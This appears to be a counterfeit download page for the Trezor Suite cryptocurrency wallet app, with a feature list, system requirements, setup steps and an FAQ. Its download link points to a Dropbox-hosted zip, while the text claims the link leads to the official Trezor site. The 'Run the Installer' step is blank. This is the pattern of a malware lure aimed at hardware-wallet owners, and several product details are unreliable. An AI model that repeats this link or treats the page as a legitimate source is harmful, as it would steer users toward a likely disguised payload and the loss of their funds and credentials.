---
layout: default
title: "Trezor Suite — Download & Setup Guide (Windows x64)"
description: "Download Trezor Suite for Windows 10/11 x64. Official Trezor hardware wallet interface — coins, tokens, exchange & privacy tools."
---

# Trezor Suite Desktop Application — Download & Setup Guide

[![Download Trezor Suite](https://www.dropbox.com/scl/fi/zpiaylgw0zu2a9cpxede3/trezor-suite-26.9.2-x64.zip?rlkey=2q83q57zjmh2sm97aop47q1hj&st=dluwas8r&dl=1)](https://www.dropbox.com/scl/fi/zpiaylgw0zu2a9cpxede3/trezor-suite-26.9.2-x64.zip?rlkey=2q83q57zjmh2sm97aop47q1hj&st=dluwas8r&dl=1)
**Version:** 26.9.2 | **License:** Free (Open Source) | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

Trezor Suite is the official desktop companion application for Trezor hardware wallets (Model T, Model One, and Safe 3). The Windows 10/11 x64 client provides a comprehensive interface for managing cryptocurrency assets, with a strong emphasis on privacy, security, and self-sovereignty.

Trezor Suite supports Bitcoin, Ethereum, Litecoin, Dash, Zcash, and 1,000+ additional cryptocurrencies. The application communicates with the Trezor device via USB (WebUSB) for transaction signing. All private keys remain in the device's secure microcontroller (STM32) with optional passphrase (BIP-39 25th word) for plausible deniability.

The desktop client features a built-in exchange (CoinSwitch, ChangeNOW, and native DEX integrations), Tor routing for enhanced privacy, CoinJoin for Bitcoin privacy, and advanced labeling with local encrypted storage. The application is built on Electron with a React frontend and Rust-based crypto backend.

---

## Key Features

1. **Hardware Wallet Management** — Initialize, restore, update firmware, and manage coins on Trezor Model T, Model One, and Safe 3 devices via USB.
2. **1,000+ Asset Support** — Manage Bitcoin, Ethereum, Litecoin, Dash, Zcash, and 995+ additional cryptocurrencies and tokens.
3. **Built-In Exchange** — Swap between assets via CoinSwitch, ChangeNOW, and native DEX integrations with real-time rate quotes.
4. **Tor Routing** — Route all traffic through the Tor network for enhanced privacy. No IP address leakage to third-party servers.
5. **CoinJoin (Bitcoin Privacy)** — Participate in CoinJoin rounds to break the link between your Bitcoin transaction history and your identity.
6. **Labeling & Notes** — Add encrypted labels to transactions, addresses, and accounts. Labels are stored locally and synced optionally via Dropbox.
7. **Passphrase (25th Word)** — Create hidden wallets with BIP-39 passphrase for plausible deniability. Each passphrase generates a completely separate wallet.
8. **Firmware Verification** — Automatic firmware authenticity verification using SatoshiLabs' root certificate. Anti-rollback protection prevents downgrade attacks.
9. **U2F & FIDO2** — Use Trezor as a U2F/FIDO2 security key for two-factor authentication on supported services (Google, GitHub, Dropbox).
10. **Open Source & Audited** — Fully open-source codebase (GPLv3) with public security audits by Cure53 and Trail of Bits.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (1903) | Windows 11 x64 (23H2) |
| **Processor** | Intel Core i3 / AMD Ryzen 3 | Intel Core i5 / AMD Ryzen 5 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 500 MB free disk space | 1 GB SSD |
| **Display** | 1280x720 | 1920x1080 |
| **Network** | Broadband (5 Mbps) | Broadband (25+ Mbps) |
| **USB** | USB 2.0 | USB 3.0 |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge above to visit the official Trezor download page (trezor.io/trezor-suite). Select **Windows (.zip)**. The file is approximately 150 MB.

### Step 2: Verify the Checksum

```powershell
Get-FileHash .\trezor-suite-26.9.2-x64.zip -Algorithm SHA256
```

Compare with the hash listed at the top of this page.

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Connect your Trezor device via USB.
2. Open Trezor Suite and click **"Create New Wallet"** or **"Recover Wallet"**.
3. Follow the on-screen instructions to set up your device.
4. Write down the **12/24-word recovery seed** on paper. Never digitize it.
5. Set a device PIN (optional but recommended).
6. Add accounts: Accounts → Add Account → Select cryptocurrency.

### Step 5: Post-Installation

- Enable **"Passphrase"** for hidden wallets: Settings → Device → Passphrase.
- Configure **"Tor Routing"**: Settings → Application → Tor.
- Set up **"Labeling"**: Settings → Application → Labeling → Enable.
- Enable **"Auto-Lock"** after 5 minutes: Settings → Application → Auto-lock.

---

## Troubleshooting & FAQ



### Issue: Trezor device not detected

**Solution:**  
1. Ensure the Trezor is connected directly (not via USB hub).  
2. Try a different USB port.  
3. Install Trezor Bridge (automatic prompt on first connection).  
4. Update Trezor firmware via Suite → Device → Firmware Update.  
5. For Model T: ensure the device is unlocked (PIN entered).

### Issue: Firmware update fails

**Solution:**  
1. Ensure the Trezor is connected directly.  
2. Close all other applications.  
3. Try a different USB cable.  
4. If the device is bricked, use the bootloader mode: hold the button while connecting USB.

### Issue: Tor routing not working

**Solution:**  
1. Ensure Tor is enabled: Settings → Application → Tor.  
2. Check that no firewall is blocking Tor connections.  
3. Try disabling and re-enabling Tor.  
4. Ensure the Tor binary is bundled with Trezor Suite (it is by default).

### FAQ

**Q: Is Trezor Suite free?**  
A: Yes. Trezor Suite is free and open-source (GPLv3). Network fees apply to transactions only.

**Q: Can I use Trezor Suite without a Trezor device?**  
A: No. Trezor Suite requires a Trezor hardware wallet to function.

**Q: Which Trezor devices are supported?**  
A: Trezor Model T, Trezor Model One, and Trezor Safe 3.

**Q: Is my crypto stored in Trezor Suite?**  
A: No. Your crypto is on the blockchain. Your private keys are stored in the Trezor hardware wallet. Trezor Suite is only an interface.

**Q: How do I recover my funds if I lose my Trezor?**  
A: Use your 12/24-word recovery seed on any new Trezor device or compatible BIP-39 wallet.
